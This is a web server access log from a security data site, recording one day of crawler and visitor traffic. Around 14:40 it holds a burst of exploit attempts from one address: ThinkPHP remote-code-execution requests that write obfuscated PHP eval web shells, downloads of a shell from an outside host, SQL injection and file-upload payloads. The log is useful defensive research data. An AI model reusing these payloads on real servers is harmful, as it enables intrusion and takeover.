54.36.150.31 - - [24/Jan/2020:02:44:50 -0800] "GET /self.logs/access.log.2016-11-29.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
39.104.79.172 - - [24/Jan/2020:13:25:46 -0800] "GET /statics/js/admin_common.js HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
54.36.148.67 - - [24/Jan/2020:13:35:29 -0800] "GET /self.logs/2015/error.log.2015-12-08.gz HTTP/1.1" 200 580 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.38 - - [24/Jan/2020:13:47:42 -0800] "GET /self.logs/access.log.2016-08-31.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
192.197.88.98 - - [24/Jan/2020:13:48:15 -0800] "GET / HTTP/1.1" 200 12660 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0" 
192.197.88.98 - - [24/Jan/2020:13:48:15 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0" 
159.138.156.127 - - [24/Jan/2020:13:49:10 -0800] "GET /scada_logs.zip HTTP/1.1" 404 257 "-" "Mozilla/5.0 (Linux; Android 7.0; FRD-AL00 Build/HUAWEIFRD-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043602 Safari/537.36 MicroMessenger/6.5.16.1120 NetType/WIFI Language/zh_CN" 
79.73.199.60 - - [24/Jan/2020:13:49:13 -0800] "GET / HTTP/1.1" 200 12660 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15" 
157.55.39.111 - - [24/Jan/2020:13:49:46 -0800] "GET /self.logs/access.log.2018-03-28.gz HTTP/1.1" 304 175 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.111 - - [24/Jan/2020:13:56:37 -0800] "GET /self.logs/access.log.2019-10-02.gz HTTP/1.1" 200 22861 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
108.59.0.37 - - [24/Jan/2020:14:02:27 -0800] "GET / HTTP/1.1" 200 12660 "-" "Vienna/7130 (Macintosh; Intel macOS 10_13_6)" 
40.77.167.103 - - [24/Jan/2020:14:03:25 -0800] "GET /self.logs/error.log.2017-09-08.gz HTTP/1.1" 200 847 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.161 - - [24/Jan/2020:14:07:05 -0800] "GET /self.logs/2016/error.log.2016-02-02.gz HTTP/1.1" 200 645 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.85 - - [24/Jan/2020:14:14:14 -0800] "GET /self.logs/access.log.2016-03-12.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
76.110.87.59 - - [24/Jan/2020:14:15:33 -0800] "GET / HTTP/1.1" 200 12660 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
76.110.87.59 - - [24/Jan/2020:14:15:34 -0800] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
76.110.87.59 - - [24/Jan/2020:14:15:34 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
76.110.87.59 - - [24/Jan/2020:14:15:34 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
76.110.87.59 - - [24/Jan/2020:14:15:35 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
54.36.150.87 - - [24/Jan/2020:14:19:38 -0800] "GET /self.logs/error.log.2017-04-07.gz HTTP/1.1" 200 773 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.171.224.176 - - [24/Jan/2020:14:20:07 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
91.214.5.128 - - [24/Jan/2020:14:22:59 -0800] "GET /self.logs/access.log.2017-01-01.gz HTTP/1.1" 304 175 "-" "Mozilla/4.0 (compatible;)" 
54.36.150.190 - - [24/Jan/2020:14:26:24 -0800] "GET /self.logs/access.log.2015-02-16.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.111 - - [24/Jan/2020:14:26:39 -0800] "GET /self.logs/error.log.2018-11-16.gz HTTP/1.1" 200 4349 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.111 - - [24/Jan/2020:14:26:39 -0800] "GET /self.logs/access.log.2017-07-16.gz HTTP/1.1" 200 16745 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.245 - - [24/Jan/2020:14:27:42 -0800] "GET /self.logs/error.log.2015-12-11.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.6 - - [24/Jan/2020:14:30:50 -0800] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.174 - - [24/Jan/2020:14:35:35 -0800] "GET /self.logs/2015/access.log.2015-05-08.gz HTTP/1.1" 200 4773 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.122 - - [24/Jan/2020:14:37:10 -0800] "GET /self.logs/error.log.2016-10-06.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
114.239.53.231 - - [24/Jan/2020:14:40:13 -0800] "GET / HTTP/1.1" 200 12623 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0" 
114.239.104.248 - - [24/Jan/2020:14:40:13 -0800] "POST /plus/mytag_js.php?aid=9090 HTTP/1.1" 404 294 "http://www.secrepo.com/plus/mytag_js.php?aid=9090" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:14 -0800] "POST /plus/moon.php HTTP/1.1" 404 271 "http://www.secrepo.com/plus/moon.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:14 -0800] "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?> HTTP/1.1" 200 47332 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:14 -0800] "GET /robots1.php HTTP/1.1" 404 271 "http://www.secrepo.com/robots1.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:15 -0800] "POST /robots1.php HTTP/1.1" 404 271 "http://www.secrepo.com/robots1.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:15 -0800] "GET /?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20=\"axsxsxexrxt\";$poc_1%20=%20explode(\"x\",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?> HTTP/1.1" 200 47332 "http://www.secrepo.com/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20=\"axsxsxexrxt\";$poc_1%20=%20explode(\"x\",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:15 -0800] "GET /12345.php HTTP/1.1" 404 271 "http://www.secrepo.com/12345.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:15 -0800] "POST /12345.php HTTP/1.1" 404 271 "http://www.secrepo.com/12345.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:15 -0800] "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20\"xinba\";$ch%20=%20explode(\".\",\"hello.ass.world.er.t\");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1" 200 47332 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20\"xinba\";$ch%20=%20explode(\".\",\"hello.ass.world.er.t\");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:16 -0800] "GET /robots.php HTTP/1.1" 404 271 "http://www.secrepo.com/robots.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:16 -0800] "POST /robots.php HTTP/1.1" 404 271 "http://www.secrepo.com/robots.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:16 -0800] "GET /?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs)); HTTP/1.1" 200 47332 "http://www.secrepo.com/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs));" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:16 -0800] "GET /x.php HTTP/1.1" 404 271 "http://www.secrepo.com/x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:16 -0800] "POST /x.php HTTP/1.1" 404 271 "http://www.secrepo.com/x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:17 -0800] "GET /index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,eGJzaGVsbCUzQyUzRnBocCUwQSUyNHN0JTIwJTNEJTIwQGNyZWF0ZV9mdW5jdGlvbiUyOCUyNyUyNyUyQyUyMCUyNF9QT1NUJTVCJTI3aHhxOTkxMjE3JTI3JTVEJTI5JTNCJTBBJTI0c3QlMjglMjklM0I= HTTP/1.1" 404 271 "http://www.secrepo.com/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,eGJzaGVsbCUzQyUzRnBocCUwQSUyNHN0JTIwJTNEJTIwQGNyZWF0ZV9mdW5jdGlvbiUyOCUyNyUyNyUyQyUyMCUyNF9QT1NUJTVCJTI3aHhxOTkxMjE3JTI3JTVEJTI5JTNCJTBBJTI0c3QlMjglMjklM0I=" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:17 -0800] "GET /user.php?act=login HTTP/1.1" 404 271 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:17 -0800] "GET /SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest HTTP/1.1" 404 271 "http://www.secrepo.com/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:17 -0800] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 271 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:18 -0800] "POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 271 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:18 -0800] "POST /index.php?m=vod-search HTTP/1.1" 404 271 "http://www.secrepo.com/index.php?m=vod-search" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:18 -0800] "GET /index.php?s=index/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php HTTP/1.1" 404 877 "http://www.secrepo.com/index.php?s=index/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:18 -0800] "GET /index.php?s=Home/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php HTTP/1.1" 404 877 "http://www.secrepo.com/index.php?s=Home/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:18 -0800] "GET /index.php?s=index/\\\\think\\\\Container/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php HTTP/1.1" 404 877 "http://www.secrepo.com/index.php?s=index/\\\\think\\\\Container/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:19 -0800] "POST /index.php HTTP/1.1" 404 271 "http://www.secrepo.com/index.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:19 -0800] "POST /index.php?s=captcha HTTP/1.1" 404 271 "http://www.secrepo.com/index.php?s=captcha" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.104.248 - - [24/Jan/2020:14:40:19 -0800] "GET /?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('nuan.php',file_get_contents('http://www.520yxsf.com/shell.txt'));</php> HTTP/1.1" 404 877 "http://www.secrepo.com/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('nuan.php',file_get_contents('http://www.520yxsf.com/shell.txt'));</php>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
54.36.150.66 - - [24/Jan/2020:14:41:25 -0800] "GET /self.logs/access.log.2015-09-16.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.183 - - [24/Jan/2020:14:48:53 -0800] "GET /self.logs/access.log.2016-05-21.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.46.13.75 - - [24/Jan/2020:14:51:38 -0800] "GET /Datasets%20Description/conn.html HTTP/1.1" 404 294 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.75 - - [24/Jan/2020:14:51:38 -0800] "GET /self.logs/access.log.2019-10-12.gz HTTP/1.1" 200 18924 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.75 - - [24/Jan/2020:14:51:40 -0800] "GET /self.logs/error.log.2017-02-17.gz HTTP/1.1" 200 813 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.75 - - [24/Jan/2020:14:51:41 -0800] "GET /self.logs/access.log.2017-07-27.gz HTTP/1.1" 200 21356 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.75 - - [24/Jan/2020:14:51:41 -0800] "GET /self.logs/error.log.2017-04-26.gz HTTP/1.1" 200 805 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.75 - - [24/Jan/2020:14:51:41 -0800] "GET /self.logs/access.log.2019-07-12.gz HTTP/1.1" 200 18150 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
58.250.125.144 - - [24/Jan/2020:15:02:35 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930795 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
108.59.0.37 - - [24/Jan/2020:15:02:38 -0800] "GET / HTTP/1.1" 200 12660 "-" "Vienna/7130 (Macintosh; Intel macOS 10_13_6)" 
66.249.64.124 - - [24/Jan/2020:15:07:25 -0800] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.141 - - [24/Jan/2020:15:07:26 -0800] "GET / HTTP/1.1" 200 12660 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.143 - - [24/Jan/2020:15:08:40 -0800] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.120 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
54.36.150.107 - - [24/Jan/2020:15:21:50 -0800] "GET /self.logs/error.log.2018-12-17.gz HTTP/1.1" 200 4270 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.171.224.176 - - [24/Jan/2020:15:23:41 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.150.186 - - [24/Jan/2020:15:23:45 -0800] "GET /self.logs/access.log.2015-08-20.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.46.13.75 - - [24/Jan/2020:15:23:46 -0800] "GET /self.logs/error.log.2019-05-11.gz HTTP/1.1" 200 3556 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.203 - - [24/Jan/2020:15:26:57 -0800] "GET /self.logs/error.log.2015-03-09.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.58 - - [24/Jan/2020:15:29:47 -0800] "GET /self.logs/error.log.2019-07-22.gz HTTP/1.1" 200 3700 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.58 - - [24/Jan/2020:15:29:47 -0800] "GET /self.logs/access.log.2019-12-09.gz HTTP/1.1" 200 21943 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.58 - - [24/Jan/2020:15:29:47 -0800] "GET /self.logs/error.log.2018-09-25.gz HTTP/1.1" 200 5701 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.58 - - [24/Jan/2020:15:29:47 -0800] "GET /self.logs/access.log.2017-03-25.gz HTTP/1.1" 200 13459 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.111 - - [24/Jan/2020:15:31:50 -0800] "GET /self.logs/access.log.2017-10-11.gz HTTP/1.1" 200 46161 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
174.196.144.196 - - [24/Jan/2020:15:32:25 -0800] "GET / HTTP/1.1" 200 12660 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Mobile/15E148 Safari/604.1" 
54.36.150.13 - - [24/Jan/2020:15:33:13 -0800] "GET /self.logs/error.log.2018-02-14.gz HTTP/1.1" 200 3962 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
37.60.116.2 - - [24/Jan/2020:15:33:48 -0800] "GET / HTTP/1.1" 200 12660 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
37.60.116.2 - - [24/Jan/2020:15:33:48 -0800] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
37.60.116.2 - - [24/Jan/2020:15:33:48 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
37.60.116.2 - - [24/Jan/2020:15:33:48 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
37.60.116.2 - - [24/Jan/2020:15:33:50 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
54.36.150.138 - - [24/Jan/2020:15:36:16 -0800] "GET /self.logs/error.log.2017-03-16.gz HTTP/1.1" 200 1018 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
40.77.167.103 - - [24/Jan/2020:15:36:31 -0800] "GET /self.logs/error.log.2019-12-21.gz HTTP/1.1" 200 1238 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
37.60.116.2 - - [24/Jan/2020:15:37:19 -0800] "GET / HTTP/1.1" 200 12660 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
37.60.116.2 - - [24/Jan/2020:15:37:19 -0800] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
37.60.116.2 - - [24/Jan/2020:15:39:35 -0800] "GET / HTTP/1.1" 200 12660 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
37.60.116.2 - - [24/Jan/2020:15:39:35 -0800] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
